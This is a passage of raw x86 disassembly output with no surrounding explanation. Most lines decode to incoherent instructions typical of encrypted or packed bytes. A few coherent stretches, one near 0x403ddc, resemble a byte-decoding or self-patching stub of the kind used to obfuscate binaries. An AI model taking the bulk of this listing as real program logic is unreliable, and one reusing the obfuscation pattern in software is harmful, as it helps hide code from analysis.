  4037bb:	icebp  
  4037bc:	inc    ecx
  4037bd:	pop    eax
  4037be:	nop
  4037bf:	cmp    eax,0x5e0c8579
  4037c4:	mov    al,ds:0xfaa65c9c
  4037c9:	or     dl,BYTE PTR [edx-0x291d04b0]
  4037cf:	in     al,0xfe
  4037d1:	cmp    BYTE PTR [ecx-0x1f],ch
  4037d4:	popa   
  4037d5:	test   eax,0x8955dc8
  4037da:	xlat   BYTE PTR ds:[ebx]
  4037db:	xchg   edx,eax
  4037dc:	lds    ebp,FWORD PTR [esp+eax*8-0x61]
  4037e0:	ins    BYTE PTR es:[edi],dx
  4037e1:	adc    bh,ch
  4037e3:	adc    BYTE PTR [edi],ah
  4037e5:	bound  ebx,QWORD PTR [eax]
  4037e7:	retf   
  4037e8:	adc    BYTE PTR [esi-0x53124e42],ah
  4037ee:	ret    0x6790
  4037f1:	rcr    dl,0xa3
  4037f4:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037f6:	mov    edi,0xfb614caa
  4037fb:	push   edx
  4037fc:	xor    al,0xeb
  4037fe:	pop    ds
  4037ff:	sub    eax,DWORD PTR [ebp+0x7bcb1b1d]
  403805:	scas   al,BYTE PTR es:[edi]
  403806:	ja     0x403885
  403808:	(bad)  
  403809:	adc    eax,0x154d425f
  40380e:	ins    DWORD PTR es:[edi],dx
  40380f:	dec    eax
  403810:	arpl   WORD PTR [ebx-0x5dbe3c4a],cx
  403816:	push   es
  403817:	xor    eax,0x7ba8fefb
  40381c:	outs   dx,DWORD PTR ds:[esi]
  40381d:	retf   0xbd05
  403820:	xor    eax,0x31e2acef
  403825:	lock lahf 
  403827:	mov    edx,0xd477dabe
  40382c:	out    dx,eax
  40382d:	add    bl,BYTE PTR [eax]
  40382f:	jp     0x403817
  403831:	loop   0x4037c3
  403833:	add    eax,0xf12e5f33
  403838:	add    DWORD PTR [edx+0x4],edi
  40383b:	test   esp,edx
  40383d:	(bad)  
  40383e:	xchg   edi,eax
  40383f:	sbb    eax,0x4ad5cd7
  403844:	psllq  mm6,QWORD PTR [ecx+eax*4+0x14513395]
  40384c:	imul   ecx,DWORD PTR [edi+0x17],0x51f178e4
  403853:	loope  0x403868
  403855:	(bad)  [eax-0x46f0de72]
  40385b:	sahf   
  40385c:	cmp    cl,ch
  40385e:	jle    0x40389f
  403860:	pop    edi
  403861:	cli    
  403862:	out    0xf9,al
  403864:	jne    0x4038d2
  403866:	jl     0x403857
  403868:	and    DWORD PTR ds:0x6da02e98,edi
  40386e:	ror    BYTE PTR [ebx+0x45],0x38
  403872:	ficomp DWORD PTR [eax+0x37]
  403875:	xor    esp,ecx
  403877:	push   esp
  403878:	mov    bh,0x32
  40387a:	push   ds
  40387b:	xor    esp,DWORD PTR ds:0xe3fabc8b
  403881:	sbb    eax,0x54fc47b4
  403886:	or     dl,BYTE PTR [edi-0x1fc52bd9]
  40388c:	pop    eax
  40388d:	retf   
  40388e:	js     0x403883
  403890:	pop    ebp
  403891:	ins    BYTE PTR es:[edi],dx
  403892:	push   ebx
  403893:	mov    ch,0x1c
  403895:	inc    esi
  403896:	test   DWORD PTR [edi],0x397b7303
  40389c:	icebp  
  40389d:	or     cl,BYTE PTR [eax+0x26]
  4038a0:	push   edi
  4038a1:	sub    edi,DWORD PTR [edx]
  4038a3:	mov    DWORD PTR [eax+0x3d532864],ebp
  4038a9:	loopne 0x40389b
  4038ab:	pop    ecx
  4038ac:	(bad)  
  4038ad:	retf   
  4038ae:	jo     0x4038c1
  4038b0:	bound  esi,QWORD PTR [ebp+0x4daf58e0]
  4038b6:	popa   
  4038b7:	outs   dx,DWORD PTR ds:[esi]
  4038b8:	neg    BYTE PTR [edx+0xf817156]
  4038be:	arpl   WORD PTR [edi-0x22afbba7],bx
  4038c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c5:	and    ecx,ebp
  4038c7:	add    bh,cl
  4038c9:	stc    
  4038ca:	cmp    eax,0x97af36ea
  4038cf:	shr    BYTE PTR [ecx],cl
  4038d1:	test   al,0x1a
  4038d3:	retf   0x2861
  4038d6:	mov    ebp,DWORD PTR [ebx+0x27]
  4038d9:	popa   
  4038da:	xchg   ebp,eax
  4038db:	inc    edx
  4038dc:	in     al,dx
  4038dd:	(bad)  
  4038de:	loope  0x40392f
  4038e0:	xchg   esp,eax
  4038e1:	mov    dh,al
  4038e3:	mov    WORD PTR [edi+esi*4-0x25370c06],gs
  4038ea:	xor    eax,0x78a74974
  4038ef:	jne    0x403945
  4038f1:	xchg   ebx,eax
  4038f2:	or     dl,BYTE PTR [edx+0x1e]
  4038f5:	data16 test BYTE PTR [ecx+0x2c0738c3],0x54
  4038fd:	call   0xf7c6:0x6b9f9572
  403904:	test   BYTE PTR [edx+ecx*8-0x474f25e1],dl
  40390b:	xchg   BYTE PTR [ebx+0x348513b9],al
  403911:	mov    al,0x7
  403913:	push   eax
  403914:	out    dx,al
  403915:	adc    eax,0x293c4f4f
  40391a:	out    dx,al
  40391b:	fs adc BYTE PTR ss:[edx-0x5c],ah
  403920:	xor    al,0x7c
  403922:	mov    ebx,0x58a0bc28
  403927:	xor    eax,0xf4f9d6d4
  40392c:	retf   
  40392d:	shl    BYTE PTR [ecx-0x19921e0a],0x9a
  403934:	dec    ebp
  403935:	mov    al,0x89
  403937:	(bad)  
  403938:	sbb    eax,0x5d96ffab
  40393d:	jne    0x403965
  40393f:	clc    
  403940:	js     0x403984
  403942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403943:	inc    edx
  403944:	mov    edx,0x5bd501ae
  403949:	pusha  
  40394a:	xor    DWORD PTR [eax],esp
  40394c:	int    0xac
  40394e:	jno    0x403921
  403950:	sbb    esp,ebp
  403952:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403953:	int3   
  403954:	jg     0x4039c9
  403956:	imul   esp,DWORD PTR [eax+edi*1],0x13279328
  40395d:	jp     0x403938
  40395f:	mov    bl,BYTE PTR [ebx-0x48]
  403962:	scas   eax,DWORD PTR es:[edi]
  403963:	fwait
  403964:	mov    ebx,DWORD PTR [ecx+0x3f]
  403967:	xor    al,BYTE PTR [ebx]
  403969:	adc    dl,BYTE PTR [edi-0x3d]
  40396c:	pop    eax
  40396d:	cmp    dl,BYTE PTR [esi-0x20]
  403970:	sub    al,0x41
  403972:	ds arpl bx,bx
  403975:	dec    esi
  403976:	out    dx,al
  403977:	in     eax,0x9b
  403979:	jbe    0x403996
  40397b:	adc    dh,BYTE PTR [eax]
  40397d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40397e:	ins    BYTE PTR es:[edi],dx
  40397f:	fldcw  WORD PTR [ebx]
  403981:	pmovmskb edi,mm0
  403984:	mov    al,0x67
  403986:	fisubr WORD PTR [edx]
  403988:	or     al,BYTE PTR [edx+0x64a45149]
  40398e:	fucomi st,st(7)
  403990:	shr    BYTE PTR [ecx-0x1c],0x9
  403994:	test   eax,eax
  403996:	je     0x403dd2
  40399c:	lea    eax,[ebp-0x98]
  4039a2:	push   eax
  4039a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4039a6:	xor    eax,esi
  4039a8:	add    eax,edi
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	jmp    0xf771edbf
  4039d5:	sbb    eax,0x7d6f7e7e
  4039da:	jle    0x403a5a
  4039dc:	pusha  
  4039dd:	pop    edx
  4039de:	inc    edi
  4039df:	inc    eax
  4039e0:	fcmove st,st(6)
  4039e2:	je     0x40398c
  4039e4:	(bad)  
  4039e5:	mov    edx,0xdef063e0
  4039ea:	pop    eax
  4039eb:	bndldx bnd2,[ebp-0x2c]
  4039ef:	test   ebx,ecx
  4039f1:	sbb    eax,0x48e7d7de
  4039f6:	mov    esi,DWORD PTR [esi]
  4039f8:	cmc    
  4039f9:	call   0xa53b:0x8b60accd
  403a00:	div    DWORD PTR [esi+0x36]
  403a03:	jns    0x40399c
  403a05:	(bad)  
  403a06:	mov    ch,0xbd
  403a08:	daa    
  403a09:	test   BYTE PTR gs:[esi+0x1c7d08e6],cl
  403a10:	xor    BYTE PTR [eax+0x56],cl
  403a13:	inc    eax
  403a14:	cmp    DWORD PTR [ecx-0x34],eax
  403a17:	into   
  403a18:	add    eax,0x5b132c40
  403a1d:	leave  
  403a1e:	sbb    edx,DWORD PTR [di]
  403a21:	mov    ebp,0xee3ef48f
  403a26:	push   esp
  403a27:	inc    ebp
  403a28:	pop    ss
  403a29:	gs in  al,0xab
  403a2c:	out    dx,al
  403a2d:	dec    edx
  403a2e:	dec    ebp
  403a2f:	mov    cl,0xa6
  403a31:	mov    WORD PTR [edi],ss
  403a33:	inc    edx
  403a34:	dec    edi
  403a35:	stos   DWORD PTR es:[edi],eax
  403a36:	or     BYTE PTR cs:[edx],0xc0
  403a3a:	cld    
  403a3b:	es jb  0x4039c7
  403a3e:	das    
  403a3f:	mov    ecx,0xfe1c4329
  403a44:	mov    bl,bl
  403a46:	mov    fs,WORD PTR [ecx]
  403a48:	js     0x403a71
  403a4a:	sub    al,0x5b
  403a4c:	shl    BYTE PTR [edi],1
  403a4e:	or     ch,dl
  403a50:	scas   eax,DWORD PTR es:[edi]
  403a51:	or     al,0xab
  403a53:	shr    BYTE PTR [ecx],0xd7
  403a56:	lock sub eax,0x408cc8ba
  403a5c:	cld    
  403a5d:	test   eax,0x69c010bd
  403a62:	mov    esp,0x922971f1
  403a67:	adc    ebx,esi
  403a69:	mov    esp,0x9c659630
  403a6e:	mov    esp,0xbe65482e
  403a73:	das    
  403a74:	je     0x403a38
  403a76:	scas   al,BYTE PTR es:[edi]
  403a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a78:	cmp    BYTE PTR [edx-0x252f41d1],0xb1
  403a7f:	(bad)  
  403a80:	rcl    BYTE PTR [ebx],cl
  403a82:	nop
  403a83:	pop    ecx
  403a84:	cwde   
  403a85:	xor    eax,DWORD PTR [edi]
  403a87:	jne    0x403af5
  403a89:	scas   eax,DWORD PTR es:[edi]
  403a8a:	ficomp DWORD PTR [edx+0xc9f658b]
  403a90:	retf   
  403a91:	stc    
  403a92:	xor    eax,DWORD PTR [ebp-0x1d]
  403a95:	out    0xe1,al
  403a97:	xor    al,0x11
  403a99:	dec    esp
  403a9a:	das    
  403a9b:	mov    eax,0xeba4cd09
  403aa0:	pop    edx
  403aa1:	das    
  403aa2:	scas   eax,DWORD PTR es:[edi]
  403aa3:	pop    edx
  403aa4:	mov    esi,0x9dd1f3bf
  403aa9:	dec    ebp
  403aaa:	hlt    
  403aab:	push   0x21b941db
  403ab0:	push   edx
  403ab1:	mov    ds:0x65cd7387,al
  403ab6:	out    dx,al
  403ab7:	pusha  
  403ab8:	(bad)
  403abb:	aas    
  403abc:	loopne 0x403a3f
  403abe:	(bad)  
  403abf:	aam    0x32
  403ac1:	sti    
  403ac2:	mov    bl,0xac
  403ac4:	add    al,0x4e
  403ac6:	gs lahf 
  403ac8:	add    DWORD PTR [ecx-0x5a4fee0c],edi
  403ace:	stos   BYTE PTR es:[edi],al
  403acf:	inc    ebp
  403ad0:	fwait
  403ad1:	int    0x4
  403ad3:	leave  
  403ad4:	sub    bh,BYTE PTR [edx-0xe]
  403ad7:	mov    ds:0xcee81ccd,al
  403adc:	clc    
  403add:	test   eax,0xd2f1949f
  403ae2:	xchg   ebp,eax
  403ae3:	or     ebp,DWORD PTR [esi+0x46]
  403ae6:	scas   al,BYTE PTR es:[edi]
  403ae7:	mov    BYTE PTR [edi-0x501f7ad3],dh
  403aed:	jp     0x403aaa
  403aef:	jp     0x403b60
  403af1:	mov    dl,0xa7
  403af3:	addr16 xchg edx,eax
  403af5:	dec    edi
  403af6:	fwait
  403af7:	sbb    edx,ebp
  403af9:	mov    dh,0x76
  403afb:	inc    edi
  403afc:	pop    edi
  403afd:	xor    eax,DWORD PTR [edx+0x54990c20]
  403b03:	rol    BYTE PTR [edi],cl
  403b05:	sub    eax,DWORD PTR [edx+eax*8]
  403b08:	loope  0x403b09
  403b0a:	hlt    
  403b0b:	rol    DWORD PTR [eax+0x4],cl
  403b0e:	js     0x403aae
  403b10:	jmp    0x403b63
  403b12:	cmp    BYTE PTR [edi+ecx*1],ah
  403b15:	nop
  403b16:	sbb    eax,0xc9ed9219
  403b1b:	ja     0x403b2d
  403b1d:	cmp    dl,BYTE PTR [eax+0x76a352a8]
  403b23:	sub    dl,BYTE PTR [ebx+0x615c61ef]
  403b29:	cmc    
  403b2a:	dec    ecx
  403b2b:	jmp    0x2e5e:0xe63317c0
  403b32:	imul   ebx,DWORD PTR [esi+0x6f9a8ae0],0x180c8e4b
  403b3c:	fild   WORD PTR ds:0x6d972d90
  403b42:	jge    0x403ae7
  403b44:	sbb    ah,0x35
  403b47:	pushf  
  403b48:	xchg   BYTE PTR [ebx-0x683e5228],dl
  403b4e:	push   edi
  403b4f:	dec    ebp
  403b50:	ret    
  403b51:	sbb    BYTE PTR gs:[edi+ebx*2+0x7a],0xbe
  403b57:	pop    edi
  403b58:	repnz sub BYTE PTR [esi-0x6],cl
  403b5c:	or     BYTE PTR [edi],bh
  403b5e:	lods   al,BYTE PTR ds:[esi]
  403b5f:	fidiv  DWORD PTR [edi+edx*4]
  403b62:	jg     0x403bbb
  403b64:	and    eax,0x64e26423
  403b69:	pop    esp
  403b6a:	sub    bl,BYTE PTR [edi+0x223d8408]
  403b70:	fistp  DWORD PTR [ebx+ebp*2+0x59]
  403b74:	pop    edi
  403b75:	shl    DWORD PTR [ebp+ebp*4+0x2f],0x5b
  403b7a:	(bad)  
  403b7b:	retf   0x1776
  403b7e:	mov    esp,0xdb30a71a
  403b83:	dec    edx
  403b84:	lahf   
  403b85:	or     dl,0x19
  403b88:	xlat   BYTE PTR ds:[ebx]
  403b89:	xchg   ebp,eax
  403b8a:	test   BYTE PTR [eax+edx*8-0x24],bh
  403b8e:	inc    esp
  403b8f:	xchg   edi,eax
  403b90:	lods   eax,DWORD PTR ds:[esi]
  403b91:	pop    ebp
  403b92:	fsub   QWORD PTR [esi]
  403b94:	sbb    DWORD PTR [ebp-0x28],edi
  403b97:	dec    esi
  403b98:	add    BYTE PTR [ebx],dh
  403b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b9b:	mov    al,ds:0xc8cfdf1c
  403ba0:	mov    edi,0xe05d3f85
  403ba5:	lds    esp,FWORD PTR [edx+0x16]
  403ba8:	mov    DWORD PTR ds:0x995e7f4c,ebx
  403bae:	xor    al,0xe9
  403bb0:	sub    eax,0x265282a0
  403bb5:	pop    ecx
  403bb6:	pushf  
  403bb7:	int    0xc4
  403bb9:	sub    al,0x4a
  403bbb:	shr    al,cl
  403bbd:	test   BYTE PTR [edi],ah
  403bbf:	nop
  403bc0:	sub    bh,bh
  403bc2:	cs mov bh,0xff
  403bc5:	sbb    edx,ebp
  403bc7:	pop    edi
  403bc8:	outs   dx,BYTE PTR ds:[esi]
  403bc9:	sbb    edx,edi
  403bcb:	dec    BYTE PTR [esi+eiz*8-0x61]
  403bcf:	std    
  403bd0:	push   cs
  403bd1:	(bad)  [edi-0x42819630]
  403bd7:	outs   dx,DWORD PTR ds:[esi]
  403bd8:	mov    edx,0xa1a97284
  403bdd:	imul   DWORD PTR ds:0x46cbd22e
  403be3:	lahf   
  403be4:	iret   
  403be5:	inc    esp
  403be6:	pusha  
  403be7:	push   eax
  403be8:	loope  0x403c4a
  403bea:	or     al,0xab
  403bec:	lods   al,BYTE PTR ds:[esi]
  403bed:	dec    ebx
  403bee:	or     DWORD PTR [eax+0x30],edx
  403bf1:	sub    bl,BYTE PTR [ebx-0xae47cd4]
  403bf7:	loopne 0x403bef
  403bf9:	icebp  
  403bfa:	test   eax,0xe23c1bf7
  403bff:	(bad)  
  403c00:	sti    
  403c01:	mov    edx,0xc0fd733d
  403c06:	jo     0x403bf5
  403c08:	sub    BYTE PTR [edx],0xfc
  403c0b:	pop    es
  403c0c:	cmc    
  403c0d:	mov    es,eax
  403c0f:	out    dx,al
  403c10:	imul   ecx,DWORD PTR [ebp-0x3f02f42c],0x5f
  403c17:	push   edi
  403c18:	mov    dl,0x8
  403c1a:	cmc    
  403c1b:	push   ebx
  403c1c:	fs jnp 0x403be5
  403c1f:	pop    ebx
  403c20:	xchg   edi,eax
  403c21:	mov    ch,0x35
  403c23:	inc    esi
  403c24:	or     eax,0x14964a9e
  403c29:	add    BYTE PTR [ebx-0x11],ch
  403c2c:	inc    ecx
  403c2d:	pop    si
  403c2f:	push   ebx
  403c30:	pop    edi
  403c31:	push   edx
  403c32:	call   0x7887:0x52bf32a
  403c39:	dec    edx
  403c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c3b:	int3   
  403c3c:	cwde   
  403c3d:	jnp    0x403c20
  403c3f:	ins    DWORD PTR es:[edi],dx
  403c40:	adc    edx,DWORD PTR [edi-0x5e]
  403c43:	cmp    al,0xcc
  403c45:	sbb    dh,dl
  403c47:	adc    DWORD PTR [ebx+0x53],esp
  403c4a:	push   ebp
  403c4b:	or     eax,0xcca40e74
  403c50:	or     ecx,DWORD PTR [ebp+0x5b]
  403c53:	xchg   ecx,eax
  403c54:	inc    esp
  403c55:	out    dx,eax
  403c56:	or     dl,BYTE PTR [ebx-0x4c]
  403c59:	mov    cl,0xe3
  403c5b:	(bad)  
  403c5c:	push   ebp
  403c5d:	loopne 0x403bff
  403c5f:	rcl    dl,cl
  403c61:	push   ds
  403c62:	shl    DWORD PTR [esi+ebp*2-0x5fdb7d7d],1
  403c69:	repnz out dx,eax
  403c6b:	cmp    BYTE PTR [eax],ch
  403c6d:	out    dx,al
  403c6e:	stos   BYTE PTR es:[edi],al
  403c6f:	jle    0x403c6a
  403c71:	lahf   
  403c72:	dec    ecx
  403c73:	add    edx,ebp
  403c75:	cs push es
  403c77:	aas    
  403c78:	stc    
  403c79:	jmp    0x88ef:0x22419fad
  403c80:	nop
  403c81:	clc    
  403c82:	xchg   DWORD PTR [edi+ebp*1],ebp
  403c85:	mov    esi,0x57d93503
  403c8a:	sbb    eax,DWORD PTR [edx+0x7ac7ec4d]
  403c90:	in     eax,0xcb
  403c92:	sar    DWORD PTR [eax+0x33284f8f],0xe7
  403c99:	mov    cl,0x1
  403c9b:	pop    esp
  403c9c:	mov    al,0xed
  403c9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c9f:	and    eax,0xd8bc0c74
  403ca4:	mov    ds:0x65ddfd0b,eax
  403ca9:	dec    edi
  403caa:	movsx  ebp,bh
  403cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cae:	dec    esp
  403caf:	ret    0x45c4
  403cb2:	ret    0x9135
  403cb5:	loopne 0x403cc0
  403cb7:	push   DWORD PTR [ebx+0x770f5936]
  403cbd:	(bad)  
  403cbf:	das    
  403cc0:	inc    eax
  403cc1:	fld    QWORD PTR ds:0xcc42d884
  403cc7:	fadd   DWORD PTR [ebp-0x1cd646ea]
  403ccd:	imul   DWORD PTR [ebx-0x6c84cfab]
  403cd3:	iret   
  403cd4:	int3   
  403cd5:	or     ch,bl
  403cd7:	mov    WORD PTR [ebx-0x2e5cb383],?
  403cdd:	sub    ebx,edi
  403cdf:	nop
  403ce0:	ds or  eax,ebp
  403ce3:	imul   edi,DWORD PTR [eax],0x5a
  403ce6:	dec    ebp
  403ce7:	sbb    esi,0xffffffa0
  403cea:	sub    DWORD PTR [edi+0x185b43c0],0x5630401f
  403cf4:	inc    eax
  403cf5:	xor    ah,0xd1
  403cf8:	cmp    eax,0x964ba5c3
  403cfd:	in     al,0xf1
  403cff:	inc    eax
  403d00:	add    eax,0x25a4086
  403d05:	(bad)  
  403d06:	pop    ebp
  403d07:	lahf   
  403d08:	(bad)  
  403d09:	hlt    
  403d0a:	fild   WORD PTR [esi]
  403d0c:	imul   edi,DWORD PTR [edx+0x5268d87],0x469dfa27
  403d16:	mov    esp,0xd470d989
  403d1b:	mov    bl,0x9
  403d1d:	dec    edx
  403d1e:	jmp    0x5fbf:0xa8a1a681
  403d25:	aas    
  403d26:	sbb    ch,0xb5
  403d29:	push   edx
  403d2a:	sbb    DWORD PTR [ecx-0x67ec9d78],eax
  403d30:	pop    ecx
  403d31:	popa   
  403d32:	jp     0x403d72
  403d34:	in     al,0x83
  403d36:	in     al,dx
  403d37:	xchg   DWORD PTR [esi+esi*4-0x5c],esp
  403d3b:	dec    eax
  403d3c:	stos   DWORD PTR es:[edi],eax
  403d3d:	aaa    
  403d3e:	push   ebp
  403d3f:	xchg   DWORD PTR [ebp+0x73],ecx
  403d42:	cmp    DWORD PTR [ebp-0x80],edx
  403d45:	outs   dx,DWORD PTR ds:[esi]
  403d46:	repnz adc al,0x14
  403d49:	gs stos BYTE PTR es:[edi],al
  403d4b:	cmp    al,ah
  403d4d:	dec    ecx
  403d4e:	jb     0x403d7c
  403d50:	or     ebx,eax
  403d52:	(bad)  
  403d53:	fisttp QWORD PTR [edx-0x2283b213]
  403d59:	fistp  QWORD PTR [ebx+0x53]
  403d5c:	dec    edi
  403d5d:	(bad)  
  403d5e:	call   0x13ec:0x5fb0c095
  403d65:	mov    ecx,0x24f9a9ca
  403d6a:	retf   0x225d
  403d6d:	icebp  
  403d6e:	lods   eax,DWORD PTR ds:[esi]
  403d6f:	xor    bl,ch
  403d71:	(bad)  
  403d72:	lock mov ch,BYTE PTR [edx+0x3d]
  403d76:	repnz neg DWORD PTR [esi-0xd079306]
  403d7d:	adc    edi,DWORD PTR [edi]
  403d7f:	or     ebx,eax
  403d81:	sar    bl,0xf3
  403d84:	inc    ebx
  403d85:	xchg   BYTE PTR gs:[ebx],ah
  403d88:	cmpxchg BYTE PTR [edx-0x25],cl
  403d8c:	mov    esi,0xe51e8ddf
  403d91:	loope  0x403d55
  403d93:	cmp    al,0x5f
  403d95:	dec    ecx
  403d96:	adc    al,0xa2
  403d98:	frstor [esi*1+0x45b6f263]
  403d9f:	add    edx,edx
  403da1:	ret    
  403da2:	push   ebp
  403da3:	ja     0x403de1
  403da5:	or     esi,DWORD PTR ds:0x3ed456ca
  403dab:	pop    ds
  403dac:	jp     0x403d4e
  403dae:	sbb    eax,eax
  403db0:	adc    BYTE PTR [ecx+0x52],dh
  403db3:	out    0xfe,al
  403db5:	in     eax,dx
  403db6:	sbb    edi,ebx
  403db8:	dec    ebx
  403db9:	sbb    ah,ah
  403dbb:	cdq    
  403dbc:	jmp    0x7ed26de1
  403dc1:	ret    0x8da6
  403dc4:	xor    ch,BYTE PTR [ebx]
  403dc6:	clc    
  403dc7:	push   0x7c4c8f2b
  403dcc:	jo     0x403db6
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    esp,ebx
  403e13:	jbe    0x403e80
  403e15:	jo     0x403dfb
  403e17:	sbb    DWORD PTR [esi+0x7e],edi
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e0d
  403e1f:	xor    eax,0xd5b7dee5
  403e24:	cs jg  0x403deb
  403e27:	sbb    dl,bh
  403e29:	jmp    0x5379:0x17b1ceed
  403e30:	xchg   ebp,eax
  403e31:	loope  0x403e1f
  403e33:	in     eax,0x26
  403e35:	sbb    ebx,DWORD PTR [esi+ecx*2]
  403e38:	inc    ebp
  403e39:	sbb    al,0x44
  403e3b:	cwde   
  403e3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3d:	mov    bh,0x4b
  403e3f:	xchg   edx,eax
  403e40:	or     eax,0xe603b58e
  403e45:	mov    es,ebx
  403e47:	les    ecx,FWORD PTR [edi]
  403e49:	inc    esp
  403e4a:	add    bh,0xcb
  403e4d:	push   es
  403e4e:	pop    eax
  403e4f:	pop    esi
  403e50:	lods   al,BYTE PTR ds:[esi]
  403e51:	inc    edx
  403e52:	push   0x3359c1b
  403e57:	or     al,0x8b
  403e59:	dec    edx
  403e5a:	mov    ecx,ebp
  403e5c:	shr    bh,0x42
  403e5f:	daa    
  403e60:	add    BYTE PTR [ecx+ecx*8],dl
  403e63:	loop   0x403ede
  403e65:	repnz and al,0x43
  403e68:	cwde   
  403e69:	jle    0x403e13
  403e6b:	aaa    
  403e6c:	fwait
  403e6d:	test   al,0x7c
  403e6f:	dec    esi
  403e70:	inc    ebp
  403e71:	dec    ebp
  403e72:	xor    ebx,DWORD PTR [eax]
  403e74:	rcl    edx,0x83
  403e77:	mov    DWORD PTR [esi],ebx
  403e79:	add    DWORD PTR [edx],ecx
  403e7b:	and    al,0x39
  403e7d:	ror    al,cl
  403e7f:	sbb    bl,cl
  403e81:	jo     0x403e95
  403e83:	cmp    al,0xfe
  403e85:	jmp    0xef2d:0xc87c3dd0
  403e8c:	repz rol BYTE PTR ds:[ecx],0x11
  403e91:	mov    BYTE PTR [edx],ch
  403e93:	cli    
  403e94:	shl    DWORD PTR [edi+edx*4+0x27],1
  403e98:	jmp    0x95545901
  403e9d:	dec    ecx
  403e9e:	push   edi
  403e9f:	scas   al,BYTE PTR es:[edi]
  403ea0:	sub    ah,BYTE PTR [esi]
  403ea2:	push   ss
  403ea3:	mov    esp,0x682291ca
  403ea8:	sbb    DWORD PTR [esi+0x795344d4],0x7a
  403eaf:	pop    edx
  403eb0:	daa    
  403eb1:	jle    0x403ef7
  403eb3:	jg     0x403ea9
  403eb5:	push   cs
  403eb6:	in     al,0xf2
  403eb8:	int3   
  403eb9:	or     eax,0x657ea35a
  403ebe:	mov    edx,DWORD PTR [ebp-0x10]
  403ec1:	ret    0x2358
  403ec4:	cmp    al,dh
  403ec6:	dec    ecx
  403ec7:	sbb    ch,cl
  403ec9:	mov    bl,0xc7
  403ecb:	push   es
  403ecc:	clc    
  403ecd:	loopne 0x403f4c
  403ecf:	push   eax
  403ed0:	ret    0x91f6
  403ed3:	inc    ecx
  403ed4:	retf   
  403ed5:	add    dl,BYTE PTR [ebp+0x5212d40d]
  403edb:	dec    ebx
  403edc:	jo     0x403f24
  403ede:	jae    0x403e83
  403ee0:	jno    0x403ef2
  403ee2:	retf   
  403ee3:	sti    
  403ee4:	xor    DWORD PTR es:[ebx-0x19],eax
  403ee8:	inc    esi
  403ee9:	iret   
  403eea:	daa    
  403eeb:	(bad)
  403eee:	sub    ebp,DWORD PTR [ecx+0x6c]
  403ef1:	mov    edx,0xb9bf8591
  403ef6:	fadd   st,st(7)
  403ef8:	push   es
  403ef9:	or     eax,0xaf56fbd2
  403efe:	or     ecx,ebp
  403f00:	sti    
  403f01:	fmul   DWORD PTR ds:0xa9c80b85
  403f07:	stos   DWORD PTR es:[edi],eax
  403f08:	mov    edi,0x52f77070
  403f0d:	loopne 0x403f2e
  403f0f:	adc    ch,BYTE PTR [edi]
  403f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f13:	and    al,0x19
  403f15:	add    BYTE PTR [eax],bh
  403f17:	repnz xchg ecx,eax
  403f19:	fld    DWORD PTR [ecx+0xb567f53]
  403f1f:	sar    DWORD PTR [edi+0x173b2918],cl
  403f25:	loope  0x403f86
  403f27:	push   0xc7fd7b18
  403f2c:	(bad)  
  403f2d:	aam    0x39
  403f2f:	and    al,0x69
  403f31:	dec    ebp
  403f32:	dec    ebp
  403f33:	or     ebp,edx
  403f35:	out    dx,eax
  403f36:	(bad)  
  403f37:	lods   eax,DWORD PTR ds:[esi]
  403f38:	mov    edi,0x60c099fd
  403f3d:	sub    BYTE PTR [ecx],dl
  403f3f:	dec    BYTE PTR [eax+0x59]
  403f42:	adc    ch,BYTE PTR [esp+ebp*8-0x62]
  403f46:	xchg   ebp,eax
  403f47:	loopne 0x403f9a
  403f49:	push   es
  403f4a:	ret    
  403f4b:	jmp    0x403edc
  403f4d:	dec    ecx
  403f4e:	(bad)  
  403f4f:	jns    0x403fbf
  403f51:	fnstenv [ebx+0x39782c71]
  403f57:	xor    DWORD PTR [eax+0x1a],0x184994ad
  403f5e:	push   es
  403f5f:	or     al,BYTE PTR [ebx+0x5d]
  403f62:	scas   al,BYTE PTR es:[edi]
  403f63:	dec    esi
  403f64:	xor    al,0x6c
  403f66:	clc    
  403f67:	jp     0x403f3d
  403f69:	retfw  
  403f6b:	pop    ecx
